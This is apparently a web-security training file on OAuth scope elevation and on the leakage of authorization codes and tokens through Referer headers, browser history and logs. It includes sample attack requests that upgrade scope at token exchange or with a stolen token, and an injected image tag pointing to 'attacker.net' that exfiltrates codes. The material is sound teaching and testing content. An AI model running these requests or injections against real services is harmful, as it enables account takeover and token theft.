# Scope Elevation and Token Leakage Attacks

## Two Related but Distinct Attack Classes in This File

This file covers two mechanisms that are often discussed together because they both involve the *value* of an already-issued token or code being greater than it should be — but they work through completely different weaknesses:

- **Scope elevation** — getting an access token issued with more permissions than the user actually consented to, by manipulating the `scope` parameter at a point in the flow where the server fails to re-validate it.
- **Token/code leakage** — a correctly-scoped, correctly-issued code or token ending up somewhere it shouldn't be (Referer headers, browser history, server logs) purely as a side effect of how it travels through HTTP, independent of any validation flaw in the OAuth logic itself.

---

## Part 1: Scope Elevation

### 1.1 The Trust Assumption Being Broken

Recall from File 1 that the user consents to a specific `scope` at the authorization step, and the resulting access token is supposed to be limited to exactly that consented scope. The vulnerability arises when a **later** step in the flow accepts a *different* scope value without re-checking it against what the user actually approved.

### 1.2 Scope Upgrade — Authorization Code Flow

This variant requires the attacker to control their **own registered client application** with the OAuth service — a realistic precondition, since OAuth providers commonly allow public self-service client registration.

**Step 1 — Attacker's client requests limited scope, user approves it**

```
GET /auth?client_id=ATTACKER_CLIENT_ID&redirect_uri=https://attacker-app.com/callback&response_type=code&scope=openid%20email HTTP/1.1
Host: oauth-authorization-server.com
```

The victim sees a consent screen asking to approve access to `openid email` only — a narrow, unremarkable-looking request, which is exactly why users approve it without hesitation.

**Step 2 — Authorization server issues a code scoped to what was approved**

```
HTTP/1.1 302 Found
Location: https://attacker-app.com/callback?code=a1b2c3d4e5f6g7h8&state=...
```

**Step 3 — The attacker, redeeming the code from their own backend, adds additional scope to the exchange request**

```
POST /token HTTP/1.1
Host: oauth-authorization-server.com
Content-Type: application/x-www-form-urlencoded

client_id=ATTACKER_CLIENT_ID&client_secret=ATTACKER_SECRET&redirect_uri=https://attacker-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20email%20profile
```

**Flag-by-flag breakdown of the manipulation:**
- `code=a1b2c3d4e5f6g7h8` — the legitimately-issued code from the narrow-scope consent. This part is completely valid and unmodified.
- `scope=openid%20email%20profile` — the attacker adds `profile` here, a scope the user was **never shown and never approved**. This is a value the attacker fully controls, since this entire request originates from the attacker's own backend, which they operate.
- The server's flaw: it treats the `scope` parameter in the token exchange request as authoritative, rather than deriving the token's actual scope from what was recorded against that specific `code` at authorization time. A correctly implemented authorization server ignores (or strictly validates a subset relationship for) any `scope` value submitted at token exchange time, using only the scope stored server-side from the original consent.

**Result:**

```json
{
  "access_token": "z0y9x8w7v6u5",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "openid email profile"
}
```

The attacker's application now holds a token with broader access than the user ever consented to, entirely through a server-to-server request the user never sees.

### 1.3 Scope Upgrade — Implicit Flow

Since the Implicit flow delivers the token directly to the browser (File 1, Section 3), an attacker who has stolen a token belonging to some other, innocent client application (via any of the token-leakage techniques in File 2 or Part 2 of this file) can attempt to use that stolen token against the resource server's `/userinfo` endpoint while manually appending an expanded scope:

```
GET /userinfo?access_token=STOLEN_TOKEN&scope=openid%20profile%20email%20admin HTTP/1.1
Host: oauth-resource-server.com
```

**Why this sometimes works:** if the resource server validates a submitted `scope` parameter only by checking that it doesn't exceed what the *client application* (identified by the token) is generally permitted to request, rather than checking it against what **this specific token instance** was actually issued with, the attacker can request any scope up to the client's ceiling — even though the real user never approved that broader access for this particular login session. The topic material is explicit that "as long as the adjusted permissions don't exceed the level of access previously granted to this client application" (not to this token), some implementations will grant it — this is the precise validation gap to test for.

**Practical testing note:** this only matters if you already have a valid stolen token to work with — it's an escalation technique layered on top of the token-leakage mechanisms elsewhere in this file and in File 2, not a standalone entry point.

### 1.4 Testing Methodology for Scope Elevation

1. Register your own test client application with the target OAuth service if self-service registration is available (very common with API platforms — relevant to API security assessments specifically).
2. Initiate a flow requesting a deliberately narrow scope and note exactly what the consent screen displays to the user.
3. Intercept the token exchange (Authorization Code flow) or the resource-server request (Implicit flow / any bearer-token API call) in Burp and add additional scope values not present in the original consent.
4. Inspect the returned token's actual granted scope (either in the token response body, or by testing what the token can actually access against the resource server) — if it reflects the expanded scope, the server isn't re-validating against the original grant.
5. Always test scopes that map to genuinely higher-privilege data or actions — `email` to `admin`, `read` to `write`, `profile:self` to `profile:*` — since the practical severity of this bug depends entirely on how much more access the elevated scope actually grants.

---

## Part 2: Authorization Code and Token Leakage

This section covers codes and tokens leaking through ordinary HTTP mechanics, independent of any redirect_uri or scope validation bug. These leaks matter because a leaked code or token is exactly as useful to an attacker as one obtained through active interception — the delivery mechanism doesn't matter to the resource server.

### 2.1 Referer Header Leakage

**The mechanism:** when a browser navigates from a page to a resource on another origin (loading an image, a script, a stylesheet, or following a link), it may include a `Referer` header on that outbound request containing the **full URL of the page it came from — including the query string.**

If a page has any authorization code or (rarer, since fragments aren't sent in Referer — see 2.2) access token sitting in its URL's query string, and that page contains **any** reference to third-party content — an ad, an analytics pixel, a font loaded from a CDN, a social share widget — the code or token is transmitted to that third party's server logs as part of the standard `Referer` header, with zero attacker interaction required.

```
GET /callback?code=SplxlOBeZQQYbYS6WxSbIA&state=xyz789 HTTP/1.1
Host: client-app.com

[page loads, includes: <img src="https://analytics-vendor.com/pixel.gif">]

--- resulting outbound request ---
GET /pixel.gif HTTP/1.1
Host: analytics-vendor.com
Referer: https://client-app.com/callback?code=SplxlOBeZQQYbYS6WxSbIA&state=xyz789
```

**Why this is exploitable even without a validation bug:** this leak happens purely because the code was placed in a query string, on a page that also happens to load third-party content — a completely mundane, common web development pattern. The vulnerability isn't in the OAuth logic at all; it's in **not treating the callback page as a page that must never load any third-party content while sensitive query parameters are present**, and (defensively) not redeeming and clearing the code from the URL bar immediately, before any other content on that page has a chance to load.

**Where an attacker actively exploits this rather than passively observing it:** if you (as attacker) control a page on the redirect_uri whitelist through any of File 2's chaining techniques, and that page reflects attacker-controllable HTML (an HTML injection point, as described in File 2 Section 2.5), you can deliberately inject a resource tag pointing to your own server, turning a passive leak vector into an active exfiltration primitive:

```html
<img src="https://attacker.net/leak">
```

Some browsers (Firefox historically being the most consistently cited example) send the complete referring URL including the query string on this kind of request, which — if the injection point sits on a page whose URL still carries the authorization code in its query string — hands the attacker the code directly via their own server access logs.

### 2.2 Why URL Fragments Are Comparatively Safer (and When That Breaks Down)

As covered in File 1, the Implicit flow deliberately places the access token after a `#` specifically because fragments are **not** sent to the server on ordinary navigation and are **not** included in the `Referer` header by browsers. This is a genuine security property, not an accident.

It breaks down when:
- Client-side JavaScript reads the fragment and then **re-embeds it into the query string or DOM** of a later request — e.g., a single-page app that reads `location.hash` and passes the token along as a query parameter to its own backend API, at which point it's now subject to ordinary Referer leakage on any subsequent third-party resource load on that same page.
- The open-redirect / proxy-page chaining from File 2 uses a client-side JS redirect that reconstructs the destination URL by hand, potentially converting a fragment into a query parameter in the process (this is precisely why File 2 flags implementation details of an open redirect as determining whether it leaks tokens, codes, or both).

### 2.3 Browser History Exposure

Both authorization codes and (less commonly, due to the fragment behavior above) tokens that appear in a page's URL are recorded in the browser's local history by the URL itself. On a shared or later-compromised device, or via browser-history-stealing techniques (CSS `:visited` timing attacks, browser extension over-permissioning, malware with local history access), a code sitting in history is retrievable well after the original flow completed — though its practical value is limited by the code's short lifetime unless it's an access token in history rather than a short-lived code, since access tokens typically live much longer (the `expires_in` value from File 1, often measured in hours).

### 2.4 Server-Side Log Exposure

Any authorization code or access token that appears in a URL — query string specifically, since most standard web server access logs (Apache, Nginx, cloud load balancer logs, CDN logs) record the full request line including the query string by default — ends up persisted in plaintext in:

- The client application's own web server access logs.
- Any reverse proxy, load balancer, or CDN sitting in front of it.
- Third-party logging/APM services (Datadog, New Relic, Sentry) if request URLs are captured as part of error or performance telemetry — a very commonly overlooked exposure path, since these tools are often configured by a different team than the one that built the OAuth integration, and neither team necessarily audits what the other is capturing.
- Any analytics platform receiving pageview events that include the full URL (Google Analytics, Mixpanel, etc., unless the application explicitly strips sensitive query parameters before firing the pageview event).

**Why this matters as its own finding class, separate from active interception:** a penetration tester or bug bounty hunter can often demonstrate this risk without ever "stealing" anything from a live victim — showing that the application's OAuth callback places a long-lived, sensitive value in a URL structure that will predictably be captured by standard logging infrastructure is, on its own, a legitimate and reportable design flaw, distinct from (and often easier to demonstrate than) a full end-to-end account takeover chain.

### 2.5 Testing Methodology for Leakage

1. Complete a full OAuth flow while proxying through Burp and identify every point where a code or token appears in a URL (query string vs. fragment — note the distinction, since it changes which of the following tests are relevant).
2. If the code/token appears in a query string on any page: check that page's HTML source and network requests for any third-party resource loads (images, fonts, scripts, iframes, analytics/ad pixels) and confirm via Burp whether the `Referer` header on those outbound requests includes the sensitive query string.
3. Check whether the callback page immediately performs a redirect/history replacement (`history.replaceState`, a subsequent 302) to strip the code from the visible URL before any other page content loads — a well-implemented callback page does this as fast as possible specifically to shrink this exposure window.
4. If you have access to any application logs, APM dashboards, or analytics tooling during an authorized engagement, check directly whether authorization codes/tokens are present in captured request URLs.
5. For fragment-based tokens (Implicit flow), check whether any client-side JavaScript on the page reads `location.hash` and subsequently issues a request with that value present as a query parameter rather than in a request body or `Authorization` header — this is the point where a fragment-protected value becomes Referer-leakable.

---

## 3. PortSwigger Lab Mapping (Scope and Leakage Track)

| Difficulty | Lab | What it teaches from this file |
|---|---|---|
| Expert | **Stealing OAuth access tokens via a proxy page** | Directly exercises Section 2.1's HTML-injection-to-Referer-leak chain, layered on top of File 2's redirect_uri whitelist navigation |

**Honest gap disclosure:** the scope elevation techniques in Part 1 of this file (Sections 1.2–1.4) are documented in PortSwigger's written OAuth topic material under "Flawed scope validation," but I'm not aware of a dedicated standalone PortSwigger lab that isolates scope upgrade as the primary objective — it's covered as topic content and testing guidance rather than as its own lab exercise. Referer-header leakage (Section 2.1) and browser-history/log exposure (Sections 2.3–2.4) are likewise covered as topic material and as a component within the "Stealing OAuth access tokens via a proxy page" lab, rather than as isolated labs of their own. If this has changed since this file was written, the live lab list is the source of truth — treat this table as reflecting the *written topic content*, which is comprehensive on this subject, more than a guaranteed hands-on lab for every individual technique.

---

## Real-World Industry Note

Scope elevation findings tend to be undervalued in initial bug reports because a broadened `scope` alone can look abstract to a non-technical triager — the fix is to always pair a scope-elevation proof of concept with a concrete demonstration of what the *elevated* scope actually lets you do (read a private email, access an admin-only API endpoint, modify billing data), since severity ratings hinge entirely on that downstream impact, not on the scope string itself. Referer and log leakage findings, conversely, are sometimes dismissed by triagers as "just a header" — the fix there is to demonstrate the actual downstream account compromise achievable once the leaked code or token is in hand, tying the leak directly back into the account-takeover mechanism from File 2, Section 1.

---

## What's Next

File 5 covers PKCE — what it was specifically designed to prevent (much of File 2's core attack), and the exact misconfigurations that leave it bypassable even when it's technically "implemented."
